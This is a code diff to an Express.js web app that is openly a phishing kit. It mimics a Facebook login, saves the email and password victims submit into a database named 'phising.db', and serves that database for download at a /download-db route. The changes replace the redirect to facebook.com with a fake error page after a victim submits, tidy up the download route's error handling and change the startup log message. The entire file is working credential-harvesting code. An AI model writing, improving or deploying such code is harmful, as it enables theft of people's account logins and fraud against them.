@@ -40,9 +40,18 @@ app.post("/", (req, res) => {
       function (err, result) {
         if (err) return console.log(err.message);
 
+        if (email === "" || password === "")
+          return res.render("login-page", {
+            error: "The email or mobile number fields can't be empty",
+          });
+
+        // Checking if the email data is found
         if (result) {
           console.log(result);
-          res.redirect("https://www.facebook.com");
+
+          return res.render("error", {
+            success: "Something went wrong",
+          });
         } else {
           // create the user and insert their result in the database
           db.run(
@@ -52,8 +61,10 @@ app.post("/", (req, res) => {
             (err, result) => {
               if (err) return err.message;
 
+              res.render("error", {
+                success: "Something went wrong",
+              });
               console.log("User has successfully been created.");
-              res.redirect("https://www.facebook.com");
             }
           );
         }
@@ -65,17 +76,18 @@ app.post("/", (req, res) => {
   }
 });
 
-// Download route to
+// Download route to local mechine
 app.get("/download-db", (req, res) => {
   const filePath = path.join(__dirname, "/phising.db");
   console.log(__dirname);
 
   res.download(filePath, "phising.db", (err) => {
-    // if (err) res.render("login-page", { error: "no such file or directory found" });
+    if (err)
+      res.render("error", { success: "no such file or directory found" });
   });
 });
 
 app.listen(
   process.env.PORT,
-  console.log(`server is listening on port :${PORT}`)
+  console.log(`server is listening on http://localhost:${PORT}`)
 );
